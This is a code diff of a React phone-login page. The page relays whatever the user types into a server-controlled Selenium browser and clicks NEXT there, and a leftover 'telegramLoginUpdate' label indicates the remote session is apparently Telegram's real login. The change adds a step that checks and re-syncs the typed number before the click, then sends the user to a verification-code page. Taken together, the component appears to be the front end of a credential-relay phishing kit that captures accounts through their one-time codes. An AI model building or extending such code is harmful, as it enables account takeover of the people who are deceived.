@@ -36,21 +36,16 @@ export const PhoneLoginPage: FC = () => {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [showCountryDropdown, setShowCountryDropdown] = useState(false);
   const [keepSignedIn, setKeepSignedIn] = useState(true);
-  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
   const [seleniumStatus, setSeleniumStatus] = useState<string>('Checking Selenium...');
   const [qrCodeButtonFound, setQrCodeButtonFound] = useState(false);
   const [isQrCodeButtonLoading, setIsQrCodeButtonLoading] = useState(false);
   const [phoneCodeInputFound, setPhoneCodeInputFound] = useState(false);
   const [phoneNumberInputFound, setPhoneNumberInputFound] = useState(false);
   const [isInputsReady, setIsInputsReady] = useState(false);
-  const [isMonitoringVerificationPage, setIsMonitoringVerificationPage] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   
   const socketRef = useRef<Socket | null>(null);
   const sessionIdRef = useRef<string>('');
-
-  // Flag to prevent state updates during our own sync operations
-  const isSyncingRef = useRef(false);
 
   // If phoneNumberFromUrl is not empty, set the phone number to the phoneNumberFromUrl
   useEffect(() => {
@@ -104,7 +99,6 @@ export const PhoneLoginPage: FC = () => {
                 // Navigate to verification code page
                 setTimeout(() => {
                   console.log('🔄 Navigating to verification code page...');
-                  setIsMonitoringVerificationPage(false);
                   
                   // Get the actual phone number from Selenium window to ensure accuracy
                   if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
@@ -262,7 +256,6 @@ export const PhoneLoginPage: FC = () => {
                 
                 // Reset isSubmitting and navigate
                 setIsSubmitting(false);
-                setIsMonitoringVerificationPage(false);
                 
                 // Navigate to verification code page
                 navigate(`/verification-code?sessionId=${sessionId}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
@@ -343,7 +336,6 @@ export const PhoneLoginPage: FC = () => {
               // CRITICAL: Navigate to verification page when detected
               if (isSubmitting) {
                 console.log('🔄 Verification page detected via dedicated check - navigating immediately!');
-                setIsMonitoringVerificationPage(false);
                 
                 // Navigate to verification code page
                 setTimeout(() => {
@@ -501,7 +493,6 @@ export const PhoneLoginPage: FC = () => {
             } else {
               console.error('❌ All connection attempts failed');
               setSeleniumStatus('❌ Failed to connect after all attempts - please refresh the page');
-              setIsSeleniumReady(false);
               setIsInputsReady(false);
             }
           }
@@ -510,7 +501,6 @@ export const PhoneLoginPage: FC = () => {
         socket.on('connect', () => {
           console.log(`✅ Connection attempt ${attempt} successful!`);
           clearTimeout(connectionTimeout);
-          setIsSeleniumReady(true); // Socket is connected
           setSeleniumStatus('Connected to server, verifying connection...');
           
           // Verify the connection is stable
@@ -525,7 +515,6 @@ export const PhoneLoginPage: FC = () => {
               }, 500);
             } else {
               console.log('❌ Connection lost after verification');
-              setIsSeleniumReady(false); // Socket lost connection
               setSeleniumStatus('Connection lost after verification, retrying...');
               if (attempt < maxAttempts) {
                 setTimeout(() => establishConnection(attempt + 1, maxAttempts), 2000);
@@ -537,7 +526,6 @@ export const PhoneLoginPage: FC = () => {
         socket.on('connect_error', (error: any) => {
           console.error(`❌ Connection attempt ${attempt} error:`, error);
           clearTimeout(connectionTimeout);
-          setIsSeleniumReady(false); // Socket connection failed
           setSeleniumStatus(`Connection error: ${error.message}`);
           setIsInputsReady(false);
           
@@ -551,7 +539,6 @@ export const PhoneLoginPage: FC = () => {
         socket.on('disconnect', (reason: any) => {
           console.log(`❌ Connection attempt ${attempt} disconnected:`, reason);
           clearTimeout(connectionTimeout);
-          setIsSeleniumReady(false); // Socket disconnected
           setIsInputsReady(false);
           setSeleniumStatus(`Connection lost: ${reason}`);
           
@@ -596,7 +583,6 @@ export const PhoneLoginPage: FC = () => {
   useEffect(() => {
     return () => {
       setIsQrCodeButtonLoading(false);
-      setIsMonitoringVerificationPage(false);
     };
   }, []);
 
@@ -687,7 +673,7 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     console.log('📱 Form submitted, clicking NEXT button in Selenium...');
@@ -699,15 +685,127 @@ export const PhoneLoginPage: FC = () => {
     setSeleniumStatus('Clicking NEXT button in Selenium...');
     
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-      // Click NEXT button in Selenium window
-      console.log('🖱️ Clicking NEXT button in Selenium window...');
+      console.log('🖱️ Proceeding to click NEXT button with validation...');
+      await clickNextButton();
+      
+    } else {
+      console.log('❌ Cannot submit - missing socket or session');
+      setSeleniumStatus('Error: Cannot connect to Selenium');
+      setIsInputsReady(true);
+      setIsSubmitting(false);
+    }
+  };
+
+  // Function to normalize phone numbers for comparison (remove spaces, special chars)
+  const normalizePhoneNumber = (phoneNumber: string): string => {
+    return phoneNumber.replace(/[\s\-\(\)]/g, '').trim();
+  };
+
+  // Function to validate phone number in Selenium before clicking NEXT
+  const validatePhoneNumberInSelenium = (): Promise<boolean> => {
+    return new Promise((resolve) => {
+      console.log('🔍 Validating phone number in Selenium before submission...');
+      setSeleniumStatus('Validating phone number in Selenium...');
+      
+      // Set up timeout for validation
+      const validationTimeout = setTimeout(() => {
+        console.log('⏰ Phone number validation timeout');
+        setSeleniumStatus('Validation timeout - proceeding anyway...');
+        resolve(true); // Proceed anyway if validation times out
+      }, 3000); // 3 second timeout
+      
+      // Set up event listener for phone number validation result
+      socketRef.current?.once('getPhoneNumberFromSeleniumResult', (data) => {
+        clearTimeout(validationTimeout);
+        console.log('📥 Received phone number validation result:', data);
+        
+        if (data.sessionId === sessionIdRef.current && data.success) {
+          const seleniumPhoneNumber = data.phoneNumber;
+          const frontendPhoneNumber = phoneNumber;
+          
+          // Normalize both numbers for comparison
+          const normalizedSelenium = normalizePhoneNumber(seleniumPhoneNumber);
+          const normalizedFrontend = normalizePhoneNumber(frontendPhoneNumber);
+          
+          console.log('📱 Phone number comparison:', {
+            frontend: frontendPhoneNumber,
+            selenium: seleniumPhoneNumber,
+            normalizedFrontend: normalizedFrontend,
+            normalizedSelenium: normalizedSelenium,
+            match: normalizedFrontend === normalizedSelenium
+          });
+          
+          if (normalizedFrontend === normalizedSelenium) {
+            console.log('✅ Phone numbers match! Proceeding with submission...');
+            setSeleniumStatus('Phone number validated - proceeding...');
+            resolve(true);
+          } else {
+            console.log('❌ Phone number mismatch detected! Syncing correct number...');
+            setSeleniumStatus('Phone number mismatch - syncing to Selenium...');
+            
+            // Send the correct phone number to Selenium
+            if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+              socketRef.current.emit('syncInputToSelenium', {
+                sessionId: sessionIdRef.current,
+                inputType: 'phoneNumber',
+                value: frontendPhoneNumber,
+                timestamp: new Date().toISOString()
+              });
+              
+              // Wait a moment for sync to complete, then proceed
+              setTimeout(() => {
+                console.log('✅ Phone number synced - proceeding with submission...');
+                setSeleniumStatus('Phone number synced - proceeding...');
+                resolve(true);
+              }, 1000);
+              return;
+            }
+            
+            // If sync fails, proceed anyway
+            console.log('⚠️ Sync failed - proceeding anyway...');
+            setSeleniumStatus('Sync failed - proceeding anyway...');
+            resolve(true);
+          }
+        } else {
+          console.log('❌ Failed to get phone number from Selenium:', data.error);
+          setSeleniumStatus('Validation failed - proceeding anyway...');
+          resolve(true); // Proceed anyway if validation fails
+        }
+      });
+      
+      // Request phone number from Selenium
+      socketRef.current?.emit('getPhoneNumberFromSelenium', {
+        sessionId: sessionIdRef.current,
+        timestamp: new Date().toISOString()
+      });
+    });
+  };
+
+  // Function to click the NEXT button after validation passes
+  const clickNextButton = async () => {
+    console.log('🖱️ Clicking NEXT button in Selenium window...');
+    
+    try {
+      // First validate the phone number in Selenium
+      console.log('🔍 Starting phone number validation...');
+      const isValid = await validatePhoneNumberInSelenium();
+      console.log('🔍 Validation result:', isValid);
+      
+      if (!isValid) {
+        console.log('❌ Phone number validation failed - aborting submission');
+        setIsInputsReady(true);
+        setIsSubmitting(false);
+        return;
+      }
+      
+      console.log('✅ Validation passed - proceeding to click NEXT button');
       
       const correctSelector = '#auth-phone-number-form button[type="submit"]';
       console.log('🔍 Using selector:', correctSelector);
       
       // Set up event listener BEFORE sending the button click
-      socketRef.current.once('clickNextButtonResult', (data) => {
-        console.log('📥 Received telegramLoginUpdate response:', data);
+      socketRef.current?.once('clickNextButtonResult', (data) => {
+        console.log('📥 Received clickNextButtonResult response:', data);
         
         if (data.sessionId === sessionIdRef.current) {
           console.log('✅ NEXT button clicked successfully! Navigating to verification page...');
@@ -732,7 +830,7 @@ export const PhoneLoginPage: FC = () => {
       });
       
       // Send the button click
-      socketRef.current.emit('clickNextButton', {
+      socketRef.current?.emit('clickNextButton', {
         sessionId: sessionIdRef.current,
         selector: correctSelector,
         timestamp: new Date().toISOString()
@@ -740,23 +838,14 @@ export const PhoneLoginPage: FC = () => {
       
       console.log('✅ NEXT button click event emitted successfully');
       
-      // Set a timeout in case the process takes too long
-      setTimeout(() => {
-        if (isSubmitting) {
-          console.log('⏰ Submission timeout, re-enabling form');
-          setSeleniumStatus('Submission timeout - please try again');
-          setIsInputsReady(true); // Re-enable form
-          setIsSubmitting(false); // Reset submitting state
-        }
-      }, 15000); // 15 second timeout
-      
-    } else {
-      console.log('❌ Cannot submit - missing socket or session');
-      setSeleniumStatus('Error: Cannot connect to Selenium');
+    } catch (error) {
+      console.error('❌ Error in clickNextButton:', error);
+      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
       setIsInputsReady(true);
       setIsSubmitting(false);
     }
   };
+
 
   // Function to handle phone number input changes (NO SYNC - just update state)
   const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
